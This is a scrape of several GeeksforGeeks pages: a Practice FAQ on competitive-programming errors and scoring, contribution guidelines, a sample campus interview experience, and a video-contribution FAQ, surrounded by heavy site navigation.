Recursion [75] Prime Number [74] Numbers [62] sieve [53] Greedy [53] Combinatorial [47] DFS [40] Modular Arithmetic [38] series [36] Fibonacci [35] Divide and Conquer [34] Binary Search [34] palindrome [29] Backtracking [28] BFS [27] Geometric [21] Binary Representation [21] Algorithms [12] Game Theory [8] Merge Sort [4] Machine Learning [1] Languages Java [172] CPP [144] Others STL [135] Java-Collections [67] number-theory [56] Misc [44] sliding-window [39] Practice-Problems [32] Tutorial-Problems [30] python-loops [27] python-io [25] pattern-printing [24] permutation [24] logical-thinking [22] two-pointer-algorithm [21] doubly-linked-list [19] python-operators [19] python-list [18] python-strings [17] factorial [16] Operators [12] prefix-sum [11] python-conditionals [11] modular arithmetic [10] set [10] constructive algo [10] Regular Expression [9] Division [9] circular-linked-list [8] Traversal [8] Java-Strings [8] python [8] python-functions [8] Date-Time [7] Java-BigInteger [7] OOP [7] Data Type [7] Class [6] Java-Class and Object [6] subset [5] CPP-Control-Flow [5] Disjoint Set [5] Pattern Searching [5] logarithm [4] Factorization [4] inclusion-exclusion [4] Java-Control-Flow [4] Puzzles [4] Kadane [4] implementation [4] cpp-strings [4] python-dict [3] cpp-operator [3] python-set [3] cpp-pointers [3] Java-Operators [2] Probability [2] Pointers [2] Character Encoding [2] Gauss Elimination [2] Range Minimum Query [2] union-find [2] Quantifiers [2] anagram [2] Functions [2] circular linked list [2] cryptography [1] Computer Networks [1] c-lang [1] Shortest Path [1] Physics [1] alphabets [1] Operating Systems [1] Reverse [1] Sqrt Decomposition [1] CPP-Control-Flow [1] × Message Error Okay! × Please report if you are facing any issue on this page. Issue Type * Select Issue Content Related Issue Sofware Related Issue Examples of Content related issues .Software related issues .For queries regarding questions and quizzes, use the comment area below respective pages. Describe Your Issue * Attach Screenshot (optional) Send Close room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved

Practice | GeeksforGeeks | A computer science portal for geeks Geeksforgeeks close Problems Courses Get Hired close Sign In Sign In Problems Courses Get Hired Discussion ▲ × × Message Error OK × Note: For issues in your code/test-cases, please use Comment-System of that particular problem. Details Cancel Send × Sign In Sign Up account_circle lock Remember me Forgot Password Sign In email lock business Sign Up or Google Facebook LinkedIn GitHub Why Create an Account? By creating this account, you agree to our Privacy Policy & Cookie Policy. Please enter your email address or userHandle. account_circle Back to Login Reset Password If you are facing any issue or this is taking too long, please click to join directly. Exit Popular Company Tags Amazon Microsoft Oracle Samsung Adobe Synopsys Infosys Cisco Wipro Ola-Cabs Morgan-Stanley Goldman-Sachs show more Popular Topic Tags Maths Array Dynamic-Programming Greedy-Algorithm Hashing Tree Bit-Algorithm Matrix Backtracking Operating System Linked-List Graph show more FAQ : Frequently Asked Questions Follow @PracticeGfG Tweet Our Motto: Practice is a well designed interface intended to be “One stop”’ for practicing all kinds of coding problems. It is especially designed to practice coding problems on the topic you wish to. Be it “an interview based question” or “a simple array program”, we plan to keep all of them under one umbrella. 1) What is Competitive programming and how does it help in placements? Competitive programming is solving well-defined problems by writing computer programs under specified limits. On this practice platform too, you are required to write code under various restrictions, like execution time and memory limits for your program. Also, you are required to solve maximum number of problems in a predetermined time frame. It prepares you for the real scenario when you will actually be landing up for an interview. 2) How to write my first program in Competitive programming Environment? Please see How to begin with Competitive Programming? 3) How should I begin using GeeksforGeeks Practice, I am new to coding? Step 1: Begin with solving the Basic Problems like arrays, strings and subsequently continue to easy, medium and hard levels. If you feel that you are unable to solve them, look at the editorials available. Or you may begin with learning concepts first. Refer to basic tutorials like C, Data Structures, Algorithms for learning concepts and begin practicing coding problems thereafter. You may also use our IDE in case you do not wish to track your progress as of now. Step 2: Once you are through with the basic problems, move onto the Easy level. If at any point of time you feel that you are not able to solve the problems , please refer editorials. 4) How do I track which problems I've solved till now? You can practice as many problems as you want without creating a login. But, if you wish to track your progress and rank amongst other programmers, you will have to login or register. 5) What happens if I click on Editorial section ? You will be redirected to the detailed explanation and solution to the given problem. Click on Editorial only if you are not able to solve the problem on your own. 6) How is IDE different from Practice? IDE is meant for any problem you would like to solve using an online compiler whereas Practice platform provides well designed topic and company wise problems . 7) How does the time limit work? Every problem has an associated maximum allowed time which is called time limit for the problem. 8) My code compiles on my machine, but it is getting compilation error here. One common reason is difference in compilers. For example, some C compilers have compiler specific header files and functions. Like Turbo C supprts "conio.h", getch() and "clrscr()". These are not supported in many other compilers. There may be differences between versions of language standards implemented by different compilers. For example, one compiler might be following C99 and other might be following C11. 9) Why I am getting error- Time Limit Exceeded? How exactly it works? Time Limit Exceeded means your code has taken more time than maximum allowed time for a given problem. Reasons could be, infinite or nlong running loops or inefficient approach. 10) The output produced by "Expected Output" is same as my program, but when I submit my program, I see "Wrong" Testing your code for multiple test cases can help in identifying the problem in your code. Mostly, the problem happens due to the following two cases: Unset temporary variables: Reset all the temporary variables for each test case. Due to missing new line: Make sure that you have used " " or language specific new line character after output of every test case. 11) How to handle runtime errors in C/C++? In C/C++ Compiler doesn't produce proper error message for runtime errors. Following are common reasons we can check our code for. 1) Accessing array out of bound. Example "int arr[4]; arr[5] = 10;" 2) Writing a read only memory. Example "char *str = "GfG"; str[1] = 'F';". See this for details. 3) NULL pointer issues like accessing value at NULL or dereferencing an invalid memory. Example "int *ptr; *ptr = 10;" See this for details. Some Common Errors produced by our system: Wrong! Your output more than Expected !!: Suppose, the number of test cases for a problem are 1000, then a program should print output for 1000 test cases (in the specified number of lines), neither less nor more. In case a program is producing more number of lines than Expected/Required, this error is encountered. Wrong! Your output less than Expected !!: Suppose, the number of test cases for a problem are 1000, then a program should print output for 1000 test cases (in the specified number of lines), neither less nor more. In case a program is producing less number of lines than Expected/Required, this error is encountered. String reading from stream: In case of problems requiring reading strings with spaces, characters leftover in buffer cause incorrect results. For C/C++, use of scanf(" %[^\n ]",s) is advised.(Note: There is an intentional space between " and % which tells scanf to ignore preceding whitespace characters.). Also refer this for more ways of handling buffers. For Java, use of BufferedReader is advised. For Python, use of strip() method along with raw_input() is advised. NoSuchElementException: This is a Java specific error, when your code tries to read input more than available, such an Exception is thrown. Use of hasNext family of methods is advisable. 12) How is ranking done on Practice? Ranking is done based on individual scores. Score of a candidate is evaluated using below formula. Score = ( Number of Successful School Submissions * 0) + ( Number of Successful Basic Submissions * 1) + ( Number of Successful Easy Submissions * 2) + ( Number of Successful Medium Submissions * 4) + ( Number of Successful Hard Submissions * 8) 13) How do function problems work? In function problems, code written by users is appended to a pre-written code in case of Java/C/C++, and pre-pended to a pre-written code in case of Python. 14) Can I see the code which is appended/pre-pended to my code? There are links provided above the editor for different languages. You can click on a language to see the code with which your code is concatenated. 15) When I am trying to login, it says that I have not confirmed my email. What to do? To complete the registration process, you have to confirm your email address while you are logged in. Now, since you had not confirmed it then, you are logged out of your account. In such a case, the system will send you a new mail with the confirmation link. Click on it to confirm your email. 16) Why some links appear in orange color? Orange color links are links already visited by you in your current browser. These are stored in your browser's cache or local storage. 17) How to learn programming in an organized way? We have designed some programming courses that contain questions in increasing order of difficulty and many more features. Please see courses. Please enable JavaScript to view the comments powered by Disqus. Weekly Monthly Overall vakanksh20 56 c2h4a1r2 40 abhinavrayakwar 37 suhasjvrundavan 34 sainipankaj1708 26 nishunishuraj18 602 swastik8750 599 afaltu95 467 shashi1iitk 398 george444emmanuel 393 Ibrahim Nash 5725 blackshadows 5685 akhayrutdinov 5111 mb1973 4989 Quandray 4916 Leaderboard (Overall) × Message Error Okay! × Please report if you are facing any issue on this page. Issue Type * Select Issue Content Related Issue Sofware Related Issue Examples of Content related issues .Software related issues .For queries regarding questions and quizzes, use the comment area below respective pages. Describe Your Issue * Attach Screenshot (optional) Send Close room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved

Contribute - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Contribute If you like GeeksforGeeks and would like to contribute, you may write by clicking on the button below: Write an Article See your article appearing on the GeeksforGeeks main page and help other Geeks!! You may directly PICK AN ARTICLE from available topics to write. How Content Writing at GeeksforGeeks works? Guide to write an article and review process My Personal Notes arrow_drop_up Save Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Top 5 IDEs for C++ That You Should Try OnceHow to find index of a given element in a Vector in C++ Most Visited Articles How to update Node.js and NPM to next version ?How to Hack WPA/WPA2 WiFi Using Kali Linux?How to Dynamically Add/Remove Table Rows using jQuery ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

How to write an Interview Experience? - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ How to write an Interview Experience?Samsung Interview Experience | Set 30 (On-Campus)Samsung Interview Experience | Set 29 (On-Campus)Samsung Interview Experience | Set 28 (On-Campus)Samsung Delhi Interview Experience | Set 27 (On-Campus)Samsung Bangalore (SRIB) Interview Experience | Set 25 (For Internship)Samsung Bangalore (SRIB) Interview Experience | Set 26 (For Internship)Samsung Bangalore (SRIB) Interview Experience | Set 23 (For Internship)Yahoo Interview | Set 2Yahoo Interview | Set 1Yahoo Interview | Set 3Yahoo Interview | Set 3Internship Interview Experiences Company-WiseAmazon Interview | Set 44 (For Internship)Amazon Interview | Set 52 (For Internship)Amazon Interview | Set 54 (For Internship)Amazon Interview | Set 60 (For Internship)Amazon Interview | Set 61 (For Internship)Amazon Interview | Set 70 (On-Campus For Internship)Amazon Interview | Set 106 (On Campus for Internship)Amazon Interview | Set 113 (On-Campus for Internship)Amazon Interview | Set 117 (On-Campus for Internship)Amazon Interview | Set 118 (On-Campus for Internship)Amazon Interview | Set 114 (On-Campus for Internship)Amazon Interview QuestionsCommonly Asked Java Programming Interview Questions | Set 2How I cracked TCS DigitalMicrosoft's most asked interview questionsTCS NQT Coding Questions & How Coding Task Evaluated in TCS NQT How to write an Interview Experience? Last Updated: 13-09-2017 Hello Geeks, This is a sample interview experience to show the format of writing the interview experience. It would take just about an hour to write your interview experience and its quite easy. Include necessary tips and search your asked question on google or geeks for geeks and include its link with the question so that anyone else can refer to it to learn about the solution. If you are not able to find any relevant link of the question on Geeks for Geeks or any other website then you can mention it with the question otherwise you can skip. You can create an article on http://contribute.geeksforgeeks.org/. After creating the articles, author may use preview button to see how it looks. Once done, author needs to change status to “Pending Review”. In case you don’t want to follow these steps, you can mail a docx/doc/txt file to contribute@geeksforgeeks.org Below is a sample interview experience and get an insight on how to write your Interview experience. Sample Interview Experience Round-1 The first round comprised of 50 MCQ questions including aptitude, logical, C output questions and technical portions(Test Duration: 1 hour) :- Quantitative aptitude and Logical part was much more predominant, the questions were more intuitive and not typical paper pen/formula based. They were not very difficult but were very tricky. Suggestion: I would suggest to do practice from sites like Indiabix as it will give confidence to solve problems. Technical aptitude part covered questions from computer networks, operating system, data structures(specifically tree),digital electronics and questions from microprocessor & other electronics topic. C output questions were also there. Suggestion: I would suggest to do quizzes from geeksforgeeks to get in touch with all concepts of C and other subjects. Tips :- Solve the questions with calm mind. Don’t stress yourself during test because you have to do 50 questions in 60 minutes. Don’t spend too much time on any question if you are not able to do it in the first attempt. Round-2 (Technical Interview Round-1) 1) Questions from project. My project was on REST, so he asked various typical questions on REST(Why, How etc). He later asked me to design a REST API for a part of my project. 2) He asked me to design Uber Cab service. He gave me an instant that there are 5 lakh drivers and they all are sending a request to the server & database at a particular time. He asked how can you manage these requests efficiently. I gave answers by using the concepts of Load Balancer, Sharding, Master Slave etc. and he was pretty much happy to listen the concepts. 3) He asked me to write code from front end to back end of a particular request from any driver(say sending the information of his current location) of above designed uber using technologies like javascript, ajax, JSON, jquery, servlet, Mysql etc. I wrote 2 page code and he was satisfied. 4) Later he gave me an instant of above designed uber where sorting was the answer. So i gave him an answer using Comparator of java and wrote code for the same. 5) Discussions on MVC architecture. He said suppose you click weather.com on any browser what happens if you use MVC architecture behind and what happens if you haven’t used MVC. We had good discussion over use of Controller in MVC. Tips :- Explain using more diagrams.(I used 4-5 total pages in this interview) Round-3 (Technical Interview Round-2) 1) Again discussion on all projects. 2) Discussion over REST and SOAP. 3) I have used exist-db(Native XML Database) as a database in one of my project and mysql in other. From there we went to discussions over SQL vs No-Sql. He kept on giving me instances one after other and asked which suits best on each of them(sql or no-sql) 4) What happens when one ajax call is still running and you send an another ajax call before the data of first ajax call comes back? 5) He asked to write a javascript code of simple form comprising of login and password info. Tips :- You should know each and every word of your Resume. Round-4 (Managerial Round) 1) Basic questions about team management and team conflict. 2) What problems you faced in doing projects technologically wise and managing wise too? 3) He gave me instants which can arise during working in team and asked what will you do in them. 4) Some discussions over what technologies I know. 5) Which project do you liked the most and why? Round-5 (HR Round) 1) Tell me something about yourself. 2) What differentiates yourself from others. 3) Little discussions over my extra curricular activities written in resume. 4) Team Conflict questions. 5) What are your future plans related with further studies? 6) Do you have any Location constraints? Tips:- Know yourself before any interview. Be calm & answer politely. This article is contributed by Ashish Madaan. If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Write your Interview Experience or mail it to contribute@geeksforgeeks.org My Personal Notes arrow_drop_up Save Recommended Posts:Amazon Interview Experience | Set 167 (SDE I for 1 year 6 months experience)Adobe Interview Experience for MTS-1 (1.5 Years Experience)Walmart Lab Interview Experience | Set 7 (Off-Campus 3 Years Experience)Walmart Lab Interview Experience | Set 8 (Off-Campus 3 Years Experience)Brocade Interview Experience | Set 2 (For Software Engineer 0-2.5 Years Experience)Amazon Interview Experience | Set 241 (1.5 years experience)Amazon Interview Experience | Set 242 (1 Year Experience)Amazon Interview Experience | Set 243 (2.5 Years Experience)Oyo Rooms Interview Experience | Set 3 (For Backend Engineer, Experience <=1yrs)Amazon Interview Experience | Set 248 (4.8 Yrs Experience for SDE II)Goldman Sachs Interview Experience | Set 23 (2+ years Experience for Java Developer Role)Amazon Interview Experience | Set 391 (SDE-2, 5.5 years Experience)Arcesium Interview Experience | Set 5 (3+ years experience - Developer profile)Amazon Interview Experience | 401 (3+Years Experience for SDE II)Oyo Rooms Interview Experience | Set 12 (4+ experience Backend Developer)Microsoft Interview Experience | Set 151 (SDE-2 3.5 years experience)Paytm Interview Experience | Set 21 (5+ Experience)Goldman Sachs Interview Experience | Set 39 (1.5 years experience)Microsoft Interview Experience | Set 169 (SDE 2 for 3.5 years experience)Salesforce Interview Experience - MTS | Set 4 (6.5 Years Experience) Article Tags : Interview Experiences thumb_up 16 To-do Done 3.3 Based on 14 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Genpact Interview Experience | Set 1 (On-Campus Drive) Next last_page How to answer a coding question in an Interview? Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Interview Experiences Josh Technology Group Interview Experience for SD (On-Campus)Accenture Interview Experience (On-Campus)Amazon Interview Experience for System Development Engineer (On-Campus Dec 2020)Josh Technology Interview Experience | MCQ Online questionsJosh Technology Group Recruitment Process | Pool Drive More related articles in Interview Experiences Cognizant Interview Experience for GenC (On-Campus)Directi Interview | Set 7 (Programming Questions)Accenture Interview Experience (On-Campus 2021)Udaan Interview ExperienceIntuit Interview Experience | On-Campus Internship room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

How to contribute videos to GeeksforGeeks? - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects How to contribute videos to GeeksforGeeks? How do I get selected for the Video Content Development Internship ? All you need to do is just make one video on any topic of your interest related to computer science and mail it to videos@geeksforgeeks.org. Once it is published on our Youtube channel, you are selected. Do I get a certificate? Yes, on completion of your internship you’ll get a certificate. Do I get remuneration for the internship? Yes, you’ll be receiving remuneration depending on your performance. What types of videos can I make? You can make: Presentation Videos – Animation Videos – What are the different topics on which i can make videos? You can make videos on : Algorithms Data Structures C/C++ or any other Programming Language GATE related stuff Interview Experiences These are just major categories. If you have any other idea in mind, you are most welcome to share. Can I use the content available on the GeeksforGeeks website? Yes, for content you can use any article available on GeeksforGeeks . My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Copyright Information - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS 